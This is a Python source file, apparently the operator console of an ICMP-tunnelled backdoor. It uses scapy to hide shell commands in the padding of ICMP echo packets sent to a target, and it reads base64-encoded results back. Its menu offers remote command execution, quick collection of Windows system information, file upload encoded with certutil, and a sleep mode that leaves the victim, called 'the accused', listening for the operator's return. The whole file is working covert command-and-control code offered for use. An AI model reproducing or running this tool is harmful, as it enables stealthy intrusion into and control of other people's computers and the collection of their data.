#author:九世
#time:2019/2/20
#coding: utf-8

from scapy.all import *
import re
import base64
import os

class Server:
    def __init__(self,LHOST,RHOST):
        self.LHOST=LHOST
        self.RHOST=RHOST

    def sniffs(self):
        jieshou = sniff(iface='以太网', filter='icmp', count=1,timeout=99999)
        paddings = jieshou[0]['Padding']
        jg = str(paddings).lstrip("b'"[0]).replace("'", '')
        return jg

    def shell(self):
        user = input('shell>>>')
        if user=='q':
            return 1
        zon = IP(ttl=10, dst=self.RHOST, src=self.LHOST) / ICMP(type="echo-request") / Padding(load='@@{}'.format(user))
        send(zon, count=1)

    def shouji(self):
        self.sd('shouji')

    def reads(self,data):
        for r in data.readlines():
            yield r

    def sd(self,data):
        zon = IP(ttl=10, dst=self.RHOST, src=self.LHOST) / ICMP(type="echo-request") / Padding(load='{}'.format(data))
        send(zon, count=1)

    def fason(self):
        self.sd(data='Demo')
        jgs=self.sniffs()
        if jgs=='Demo':
            while True:
                print('[+] Connection {} patency '.format(self.RHOST))
                print('1.shell-----Execute the command')
                print('2.shouji----Windows information collection fast')
                print('3.exit------Out of the session')
                print('4.upload----file upload')
                print('5.sleep-----sleep mode')
                xw=input('choose>>>')
                if xw=='1':
                    self.sd('shell')
                    jgs2=self.sniffs()
                    if jgs2=='shell':
                        print('[+] Remote interaction is ready')
                        while True:
                            if self.shell()==1:
                                self.sd('break')
                                break
                            else:
                                data_len=''
                                while True:
                                    js=self.sniffs()
                                    try:
                                        print(bytes.decode(base64.urlsafe_b64decode(js)))
                                    except:
                                        pass
                                    if js.isdigit()== True:
                                        data_len+=js

                                    if len(data_len)>0:
                                            break

                elif xw=='2':
                    a = 0
                    print('[*] Windows information collection fast')
                    self.sd('shouji')
                    while True:
                        try:
                            jrs=self.sniffs()
                            print(bytes.decode(base64.b64decode(jrs)))
                        except:
                            pass

                        if jrs.isdigit()==True:
                            a+=int(jrs)
                        if a>0:
                            break

                elif xw=='3':
                    print('[*] exit ....')
                    self.sd('exit')
                    exit()

                elif xw=='4':
                    print('[*] file upload')
                    self.sd('upload')
                    tis=[]
                    tis.append('{}.txt'.format(str(time.time()).replace('.','')))
                    user=input('file_name>>>')
                    users=input('file>>>')
                    f=os.popen('certutil -encode {} {}'.format(users,tis[0]))
                    print(f.read())
                    dk=open('{}'.format(tis[0]),'r')
                    zz=dk.read().replace('-----BEGIN CERTIFICATE-----','').replace('-----END CERTIFICATE-----','').rstrip().strip()
                    xj=open('{}'.format(tis[0]),'w')
                    xj.write(zz)
                    xj.close()

                    self.sd(user)
                    dq=open('{}'.format(tis[0]),'r')
                    cd=0
                    for i in dq.readlines():
                        qc="".join(i.split('\n'))
                        cd+=len(qc)
                        self.sd(qc)
                    dq.close()
                    self.sd(cd)

                    sz=self.sniffs()
                    if sz=='yes':
                        print('[+] Upload ok')
                    else:
                        print('[-] Upload no')

                elif xw=='5':
                    print('[*] sleep mode')
                    print('[!] You will exit the control, but the accused will be listening all the time. Waiting for you to go online')
                    self.sd('sleep')
                    print('bai~......')
                    exit()


if __name__ == '__main__':
    while 1:
        userq=input('LHOST_IP>>>')
        user=input('RHOST_IP>>>')
        if user=='' and userq=="":
            print('[-] Target inability space')
            continue
        elif user!="" and userq !="":
            LHOSTS=userq
            RHOSTS=user
            break
        else:
            print('[-] LHOST_IP or RHOST_IP is None')
            continue

    print('[*] The original address is:{}'.format(LHOSTS))
    print('[*] The target address is:{}'.format(RHOSTS))
    obj=Server(LHOST=LHOSTS,RHOST=RHOSTS)
    obj.fason()